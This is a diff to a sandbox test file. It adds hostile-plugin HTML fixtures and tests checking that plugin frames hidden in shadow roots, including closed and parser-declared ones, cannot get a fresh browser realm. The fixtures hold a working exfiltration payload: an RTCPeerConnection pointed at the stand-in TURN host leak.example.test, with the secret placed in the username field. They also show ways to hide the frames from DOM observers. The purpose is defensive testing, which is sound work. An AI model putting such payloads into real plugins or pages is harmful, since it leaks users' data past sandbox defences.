@@ -180,6 +180,115 @@ const REMOVER_ATTACK_HTML = `<!doctype html>
   </body>
 </html>`;
 
+/**
+ * A shadow root is a second tree that neither of the remover's two tools can
+ * see: `querySelectorAll` does not descend through a shadow boundary, and a
+ * `MutationObserver` on `document` is never told about mutations inside one.
+ * An `<iframe>` in a shadow root still gets a real browsing context, so the
+ * plugin gets a fresh realm with `RTCPeerConnection` intact.
+ *
+ * Three orderings, because the boundary defeats the sweep either way round:
+ * building the shadow tree while the host is detached, filling it after the
+ * host is attached, and doing it in a `closed` root the host cannot even reach.
+ */
+const SHADOW_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      // Constructing the connection is the exfiltration: the plugin picks the
+      // TURN host and the username, so the Allocate carries its payload out.
+      var CHILD = "<script>var ice='no';try{" +
+        "var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "pc.createOffer().then(function(d){pc.setLocalDescription(d)});ice='gathering'" +
+        "}catch(e){ice='threw'}" +
+        "parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
+        "rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";
+
+      function frameIn(root, tag) {
+        var frame = document.createElement("iframe");
+        frame.srcdoc = CHILD.replace("TAG", tag);
+        root.appendChild(frame);
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        try {
+          var detached = document.createElement("div");
+          frameIn(detached.attachShadow({ mode: "open" }), "shadow-detached");
+          document.body.appendChild(detached);
+        } catch (error) {}
+
+        try {
+          var attached = document.createElement("div");
+          document.body.appendChild(attached);
+          frameIn(attached.attachShadow({ mode: "open" }), "shadow-attached");
+        } catch (error) {}
+
+        try {
+          var closed = document.createElement("div");
+          document.body.appendChild(closed);
+          frameIn(closed.attachShadow({ mode: "closed" }), "shadow-closed");
+        } catch (error) {}
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
+        }, 400);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
+/**
+ * The doors to a shadow root the observer can never see into. A closed root
+ * built by the HTML parser is unreachable from script afterwards — there is no
+ * `shadowRoot` to read and no `attachShadow` call to wrap — so the only defence
+ * is that the parser never runs over plugin markup.
+ */
+const DECLARATIVE_SHADOW_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <div id="dsd">
+      <template shadowrootmode="closed">
+        <iframe srcdoc="&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478',username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage({exfil:1,type:'child',tag:'declarative',ice:ice},'*');&lt;/script&gt;"></iframe>
+      </template>
+    </div>
+    <script>
+      var denied = [];
+      function refused(name, run) {
+        try { run(); } catch (error) { denied.push(name); }
+      }
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        var HOSTED = "<div><template shadowrootmode='closed'>" +
+          "<iframe srcdoc=\\"&lt;script&gt;parent.parent.postMessage({exfil:1,type:'child'," +
+          "tag:'TAG',ice:typeof RTCPeerConnection},'*');&lt;/script&gt;\\"><\\/iframe>" +
+          "<\\/template><\\/div>";
+
+        refused("write", function () { document.write(HOSTED.replace("TAG", "write")); });
+        refused("setHTMLUnsafe", function () {
+          document.body.setHTMLUnsafe(HOSTED.replace("TAG", "setHTMLUnsafe"));
+        });
+        refused("parseHTMLUnsafe", function () {
+          document.body.appendChild(
+            document.adoptNode(
+              Document.parseHTMLUnsafe(HOSTED.replace("TAG", "parseHTMLUnsafe")).body.firstChild,
+            ),
+          );
+        });
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept", denied: denied }, "*");
+        }, 400);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
 interface Outcomes {
   windowOpen: string;
   fetch: string;
@@ -376,5 +485,79 @@ describe("a hostile plugin", () => {
     // Any report at all means a child realm reached script execution, and every
     // such realm hands back a `RTCPeerConnection` the shell never touched.
     expect(childReports).toEqual([]);
+  });
+
+  it("cannot get a child realm by hiding the frame in a shadow root", async () => {
+    const childReports: string[] = [];
+    let swept = false;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = true;
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(SHADOW_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    await waitFor(() => (swept ? true : null), "the shadow attack to finish");
+
+    expect(childReports).toEqual([]);
+  });
+
+  it("cannot get a closed shadow root out of the HTML parser", async () => {
+    const childReports: string[] = [];
+    let denied: string[] | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        ice?: string;
+        denied?: string[];
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.ice}`);
+      }
+      if (data.type === "swept") {
+        denied = data.denied ?? [];
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(DECLARATIVE_SHADOW_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    await waitFor(() => denied, "the declarative shadow attack to finish");
+
+    expect(childReports).toEqual([]);
+    // Denying the API is the mitigation; if any of these starts succeeding
+    // again, the `<template shadowrootmode="closed">` inside it comes back with
+    // it and nothing downstream can see the frame.
+    expect(denied).toEqual(["write", "setHTMLUnsafe", "parseHTMLUnsafe"]);
   });
 });
